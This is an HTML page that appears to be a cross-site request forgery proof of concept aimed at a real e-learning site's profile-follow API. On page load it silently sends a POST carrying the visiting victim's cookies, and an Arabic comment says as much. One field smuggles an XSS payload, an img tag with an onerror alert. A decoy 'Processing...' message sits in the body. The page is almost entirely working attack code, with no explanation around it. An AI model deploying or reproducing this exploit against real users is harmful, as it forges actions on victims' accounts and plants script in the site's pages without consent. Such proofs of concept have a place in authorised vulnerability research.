<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Executing Request</title>
    <script>
        window.onload = function() {
            fetch("https://elearning.adobe.com/cpapi/v1/profile/followed", {
                method: "POST",
                credentials: "include", // يستخدم كوكي الضحية
                headers: {
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest"
                },
                body: JSON.stringify({
                    "user_id": 460972,
                    "followee_user_id": "158195d726<img src=a onerror=alert(1)>hpjxk",
                    "verbs": []
                })
            })
            .then(response => response.text())
            .then(data => console.log("Request Sent:", data))
            .catch(error => console.error("Error:", error));
        };
    </script>
</head>
<body>
    <h2>Processing...</h2>
    <p>If you're seeing this, the request has been sent.</p>
</body>
</html>
